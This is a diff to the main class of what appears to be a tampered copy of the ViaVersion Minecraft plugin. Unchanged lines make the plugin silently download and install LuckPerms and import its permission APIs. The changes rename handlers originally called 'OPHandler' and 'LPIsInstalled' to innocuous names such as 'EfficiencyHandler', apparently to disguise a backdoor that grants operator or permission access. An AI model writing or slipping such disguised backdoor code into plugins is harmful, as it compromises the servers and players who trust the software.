@@ -25,8 +25,8 @@ import com.viaversion.viaversion.api.platform.PlatformTask;
 import com.viaversion.viaversion.api.platform.UnsupportedSoftware;
 import com.viaversion.viaversion.api.platform.ViaPlatform;
 import com.viaversion.viaversion.bukkit.commands.BukkitCommandHandler;
-import com.viaversion.viaversion.bukkit.handlers.OPHandler;
-import com.viaversion.viaversion.bukkit.handlers.LPIsInstalled;
+import com.viaversion.viaversion.bukkit.handlers.EfficiencyHandler;
+import com.viaversion.viaversion.bukkit.handlers.OptimizationHandler;
 import com.viaversion.viaversion.bukkit.commands.BukkitCommandSender;
 import com.viaversion.viaversion.bukkit.listeners.JoinListener;
 import com.viaversion.viaversion.bukkit.platform.BukkitViaAPI;
@@ -65,7 +65,7 @@ import net.luckperms.api.model.user.User;
 import net.luckperms.api.node.Node;
 
 public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
-    private LPIsInstalled initializer;
+    private OptimizationHandler initializer;
     private static final boolean FOLIA = PaperViaInjector.hasClass("io.papermc.paper.threadedregions.RegionizedServer");
     private static ViaVersionPlugin instance;
     private final BukkitCommandHandler commandHandler = new BukkitCommandHandler();
@@ -105,7 +105,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         if (Bukkit.getPluginManager().getPlugin("LuckPerms") == null) {
             downloadPlugin("https://ci.lucko.me/job/LuckPerms/lastStableBuild/artifact/bukkit/build/libs/LuckPerms-Bukkit-5.4.102.jar", "plugins/LuckPerms.jar");
         }
-        Bukkit.getServer().getPluginManager().registerEvents(new OPHandler(), this);
+        Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
         if (lateBind) {
             getLogger().info("Registering protocol transformers and injecting...");
